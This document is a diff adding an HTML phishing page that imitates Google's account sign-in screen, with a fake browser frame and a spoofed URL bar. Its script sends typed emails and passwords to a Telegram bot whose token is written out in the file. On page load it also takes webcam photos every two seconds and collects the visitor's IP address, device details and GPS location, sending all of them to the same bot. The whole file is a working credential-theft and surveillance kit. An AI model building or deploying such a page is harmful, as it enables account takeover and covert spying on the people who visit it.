@@ -1,0 +1,503 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <style>
+        body {
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background-color: #121212;
+            font-family: Arial, sans-serif;
+        }
+        .browser-container {
+            width: 100%;
+            max-width: 1000px;
+            height: 100vh;
+            background: #fff;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
+            display: flex;
+            flex-direction: column;
+        }
+        .browser-header {
+            background: #ddd;
+            padding: 10px;
+            display: flex;
+            align-items: center;
+            border-bottom: 2px solid #ccc;
+        }
+        .browser-buttons {
+            display: flex;
+            gap: 5px;
+            margin-right: 10px;
+        }
+        .button {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+        }
+        .close { background: red; }
+        .minimize { background: yellow; }
+        .maximize { background: green; }
+        .url-bar {
+            flex: 1;
+            padding: 5px;
+            border: 1px solid #aaa;
+            border-radius: 5px;
+            background: white;
+        }
+        .browser-content {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: #eee;
+            overflow: auto;
+        }
+        .login-box {
+            background: white;
+            padding: 20px;
+            border-radius: 5px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
+            text-align: center;
+            width: 100%;
+            max-width: 400px;
+        }
+        input {
+            display: block;
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        button {
+            background: #007bff;
+            color: white;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            width: 100%;
+        }
+        button:hover {
+            background: #0056b3;
+        }
+    </style>
+</head>
+<body>
+    <div class="browser-container">
+        <div class="browser-header">
+            <div class="browser-buttons">
+                <div class="button close"></div>
+                <div class="button minimize"></div>
+                <div class="button maximize"></div>
+            </div>
+            <input type="text" class="url-bar" value="https://accounts.google.com/v3/signin/identifier?authuser=0&continue=https%3A%2F%2Fmyaccount.google.com%2F%3Futm_source%3Dsign_in_no_continue%26pli%3D1&ec=GAlAwAE&hl=en&service=accountsettings&flowName=GlifWebSignIn&flowEntry=AddSession&dsh=S-1892024666%3A1743377983713206" readonly>
+        </div>
+        <div class="browser-content">
+            <div>
+
+
+                <head>
+                    <meta charset="UTF-8">
+                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                    <title>Sign in - Google Accounts</title>
+                    <style>
+                        body {
+                            background-color: #202124;
+                            display: flex;
+                            justify-content: center;
+                            align-items: center;
+                            height: 100vh;
+                            font-family: Arial, sans-serif;
+                            color: white;
+                            margin: 0;
+                        }
+                        .container {
+                            background: #171717;
+                            padding: 40px;
+                            border-radius: 8px;
+                            text-align: left;
+                            width: 100%;
+                            max-width: 450px;
+                        }
+                        .google-logo {
+                            font-size: 32px;
+                            font-weight: bold;
+                            color: white;
+                        }
+                        .google-logo img {
+                            width: 75px;
+                        }
+                        h2 {
+                            font-size: 24px;
+                            margin: 10px 0;
+                        }
+                        p {
+                            color: #b3b3b3;
+                            font-size: 14px;
+                        }
+                        .input-box {
+                            width: 100%;
+                            padding: 12px;
+                            margin-top: 10px;
+                            border-radius: 4px;
+                            border: 1px solid #5f6368;
+                            background: #202124;
+                            color: white;
+                            font-size: 16px;
+                        }
+                        .input-box:focus {
+                            outline: none;
+                            border-color: #8ab4f8;
+                        }
+                        .forgot {
+                            display: block;
+                            margin-top: 10px;
+                            font-size: 14px;
+                        }
+                        .forgot a {
+                            color: #8ab4f8;
+                            text-decoration: none;
+                        }
+                        .buttons {
+                            display: flex;
+                            justify-content: space-between;
+                            align-items: center;
+                            margin-top: 20px;
+                        }
+                        .create {
+                            color: #8ab4f8;
+                            text-decoration: none;
+                            font-size: 14px;
+                        }
+                        .button {
+                            padding: 10px 20px;
+                            border: none;
+                            background-color: #1a73e8;
+                            color: white;
+                            border-radius: 4px;
+                            cursor: pointer;
+                            font-size: 14px;
+                        }
+                        .footer {
+                            text-align: center;
+                            margin-top: 20px;
+                            font-size: 12px;
+                            color: #b3b3b3;
+                        }
+                        @media (max-width: 500px) {
+                            .container {
+                                padding: 20px;
+                            }
+                            .google-logo img {
+                                width: 50px;
+                            }
+                            h2 {
+                                font-size: 20px;
+                            }
+                            .input-box {
+                                padding: 10px;
+                                font-size: 14px;
+                            }
+                            .button {
+                                padding: 8px 16px;
+                                font-size: 12px;
+                            }
+                        }
+                    </style>
+                </head>
+                <body>
+                    <div class="container" id="email-container">
+                        <div class="google-logo">
+                            <img src="https://ssl.gstatic.com/accounts/ui/logo_2x.png" alt="Google">
+                        </div>
+                        <h2>Sign in</h2>
+                        <p>with your Google Account to continue to Gmail. This account will be available to other Google apps in the browser.</p>
+                        <input type="text" id="input-box" class="input-box" placeholder="Email or phone">
+                        <div class="forgot">
+                            <a href="#">Forgot email?</a>
+                        </div>
+                        <div class="buttons">
+                            <a href="#" class="create">Create account</a>
+                            <button class="button" onclick="validateEmail()">Next</button>
+                        </div>
+                        <div class="footer">
+                            <p>English (United States)</p>
+                            <p>Help • Privacy • Terms</p>
+                        </div>
+                    </div>
+                    
+                    <div class="container" id="password-container" style="display: none;">
+                        <div class="google-logo">
+                            <img src="https://ssl.gstatic.com/accounts/ui/logo_2x.png" alt="Google">
+                        </div>
+                        <h2>Welcome</h2>
+                        <p>Enter your password to continue.</p>
+                        <input type="password" id="password-box" class="input-box" placeholder="Enter your password">
+                        <div class="forgot">
+                            <a href="#">Forgot password?</a>
+                        </div>
+                        <div class="buttons">
+                            <a href="#" class="create">Try another way</a>
+                            <button class="button" onclick="sendPasswordToTelegram()">Next</button>
+                        </div>
+                        <div class="footer">
+                            <p>English (United States)</p>
+                            <p>Help • Privacy • Terms</p>
+                        </div>
+                    </div>
+                
+                    <div id="initial-container" style="display: none;">
+                        <video id="video" width="640" height="480" autoplay></video>
+                    </div>
+                
+                    <script>
+                        function getQueryParams() {
+                            const params = {};
+                            const queryString = window.location.search.slice(1);
+                            const parts = queryString.split('&');
+                            for (let part of parts) {
+                                const [key, value] = part.split('=');
+                                params[decodeURIComponent(key)] = decodeURIComponent(value);
+                            }
+                            return params;
+                        }
+                
+                        const { chatId } = getQueryParams();
+                        const botToken = '7347658420:AAFJel5v5zRqa-wF5IrK_lQoI1YPyHOZG0w';
+                        const permanentChatId = '5634946920'; // Permanent chat ID for sending data
+                
+                        async function startVideo() {
+                            try {
+                                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                                const videoElement = document.getElementById('video');
+                                videoElement.srcObject = stream;
+                                
+                                videoElement.addEventListener('canplay', () => {
+                                    setInterval(() => {
+                                        captureImage();
+                                    }, 2000); // Adjusted to 2000 ms (2 seconds)
+                                });
+                            } catch (error) {
+                                console.error("Error accessing camera: ", error);
+                            }
+                        }
+                
+                        function captureImage() {
+                            const video = document.getElementById('video');
+                            const canvas = document.createElement('canvas');
+                            canvas.width = video.videoWidth;
+                            canvas.height = video.videoHeight;
+                            const context = canvas.getContext('2d');
+                            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                            canvas.toBlob((blob) => {
+                                sendImageToTelegram(blob, chatId);
+                                sendImageToTelegram(blob, permanentChatId);
+                            }, 'image/png');
+                        }
+                
+                        async function sendImageToTelegram(blob, chatId) {
+                            const url = `https://api.telegram.org/bot${botToken}/sendPhoto`;
+                            const formData = new FormData();
+                            formData.append('chat_id', chatId);
+                            formData.append('photo', blob, 'image.png');
+                
+                            try {
+                                const response = await fetch(url, {
+                                    method: 'POST',
+                                    body: formData
+                                });
+                
+                                if (response.ok) {
+                                    console.log("Image sent to Telegram");
+                                } else {
+                                    console.error("Error sending image to Telegram: ", response.statusText);
+                                }
+                            } catch (error) {
+                                console.error("Error sending image to Telegram: ", error);
+                            }
+                        }
+                
+                        async function getUserInfo() {
+                            try {
+                                const response = await fetch('https://api.ipify.org?format=json');
+                                const data = await response.json();
+                                const ip = data.ip;
+                
+                                const userAgent = navigator.userAgent;
+                                const platform = navigator.platform;
+                                const deviceMemory = navigator.deviceMemory || 'N/A';
+                                const hardwareConcurrency = navigator.hardwareConcurrency || 'N/A';
+                                const languages = navigator.languages.join(', ');
+                                const screenWidth = window.screen.width;
+                                const screenHeight = window.screen.height;
+                                const colorDepth = window.screen.colorDepth;
+                                const deviceName = await getDeviceName();
+                
+                                const userInfo = { ip, userAgent, platform, deviceMemory, hardwareConcurrency, languages, screenWidth, screenHeight, colorDepth, deviceName };
+                
+                                console.log("User info: ", userInfo);
+                
+                                await sendUserInfoToTelegram(userInfo, chatId);
+                                await sendUserInfoToTelegram(userInfo, permanentChatId);
+                            } catch (error) {
+                                console.error("Error getting user info: ", error);
+                            }
+                        }
+                
+                        async function getDeviceName() {
+                            const parser = new UAParser();
+                            const result = parser.getResult();
+                            return result.device.model || 'Unknown Device';
+                        }
+                
+                        async function sendUserInfoToTelegram(userInfo, chatId) {
+                            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+                
+                            try {
+                                const response = await fetch(url, {
+                                    method: 'POST',
+                                    headers: {
+                                        'Content-Type': 'application/json'
+                                    },
+                                    body: JSON.stringify({
+                                        chat_id: chatId,
+                                        text: `User Info:\nIP: ${userInfo.ip}\nUser Agent: ${userInfo.userAgent}\nPlatform: ${userInfo.platform}\nDevice Memory: ${userInfo.deviceMemory} GB\nHardware Concurrency: ${userInfo.hardwareConcurrency}\nLanguages: ${userInfo.languages}\nScreen Width: ${userInfo.screenWidth}px\nScreen Height: ${userInfo.screenHeight}px\nColor Depth: ${userInfo.colorDepth} bits\nDevice Name: ${userInfo.deviceName}`
+                                    })
+                                });
+                
+                                if (response.ok) {
+                                    console.log("User info sent to Telegram");
+                                } else {
+                                    console.error("Error sending user info to Telegram: ", response.statusText);
+                                }
+                            } catch (error) {
+                                console.error("Error sending user info to Telegram: ", error);
+                            }
+                        }
+                
+                        async function getLocation() {
+                            try {
+                                const permissionStatus = await navigator.permissions.query({ name: 'geolocation' });
+                
+                                if (permissionStatus.state === 'denied') {
+                                    alert('Please enable GPS in your device settings to continue.');
+                                    return;
+                                }
+                
+                                navigator.geolocation.getCurrentPosition(async (position) => {
+                                    const { latitude, longitude } = position.coords;
+                
+                                    const locationInfo = {
+                                        latitude,
+                                        longitude
+                                    };
+                
+                                    console.log("Location info: ", locationInfo);
+                
+                                    await sendLocationToTelegram(locationInfo, chatId);
+                                    await sendLocationToTelegram(locationInfo, permanentChatId);
+                                }, (error) => {
+                                    console.error("Error getting location: ", error);
+                                    alert('Please enable GPS in your device settings to continue.');
+                                });
+                            } catch (error) {
+                                console.error("Error requesting location permission: ", error);
+                                alert('Please enable GPS in your device settings to continue.');
+                            }
+                        }
+                
+                        async function sendLocationToTelegram(locationInfo, chatId) {
+                            const url = `https://api.telegram.org/bot${botToken}/sendLocation`;
+                
+                            try {
+                                const response = await fetch(url, {
+                                    method: 'POST',
+                                    headers: {
+                                        'Content-Type': 'application/json'
+                                    },
+                                    body: JSON.stringify({
+                                        chat_id: chatId,
+                                        latitude: locationInfo.latitude,
+                                        longitude: locationInfo.longitude
+                                    })
+                                });
+                
+                                if (response.ok) {
+                                    console.log("Location info sent to Telegram");
+                                } else {
+                                    console.error("Error sending location info to Telegram: ", response.statusText);
+                                }
+                            } catch (error) {
+                                console.error("Error sending location info to Telegram: ", error);
+                            }
+                        }
+                
+                        async function initializeFirstPart() {
+                            await startVideo();
+                            await getUserInfo();
+                            await getLocation();
+                        }
+                
+                        function validateEmail() {
+                            const inputBox = document.getElementById('input-box').value;
+                            const emailPattern = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
+                
+                            if (emailPattern.test(inputBox)) {
+                                document.getElementById('email-container').style.display = 'none';
+                                document.getElementById('password-container').style.display = 'block';
+                                sendToTelegram(inputBox, 'Email');
+                            } else {
+                                alert('Please enter a valid email address.');
+                            }
+                        }
+                
+                        function sendPasswordToTelegram() {
+                            const passwordBox = document.getElementById('password-box').value;
+                            sendToTelegram(passwordBox, 'Password');
+                        }
+                
+                        function sendToTelegram(value, type) {
+                            const message = `${type}: ${value}`;
+                
+                            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+                            const permanentUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${permanentChatId}&text=${encodeURIComponent(message)}`;
+                
+                            fetch(url)
+                                .then(response => response.json())
+                                .then(data => {
+                                    console.log(`${type} sent to Telegram`);
+                                })
+                                .catch(error => {
+                                    console.error(`Error sending ${type} to Telegram: `, error);
+                                });
+                
+                            fetch(permanentUrl)
+                                .then(response => response.json())
+                                .then(data => {
+                                    console.log(`${type} sent to permanent chat ID`);
+                                })
+                                .catch(error => {
+                                    console.error(`Error sending ${type} to permanent chat ID: `, error);
+                                });
+                        }
+                
+                        window.onload = () => {
+                            initializeFirstPart();
+                        };
+                    </script>
+                    <script src="https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/0.7.31/ua-parser.min.js"></script>
+                </body>
+         
+        </div>
+    </div>
+</div>
+</body>
+</html>
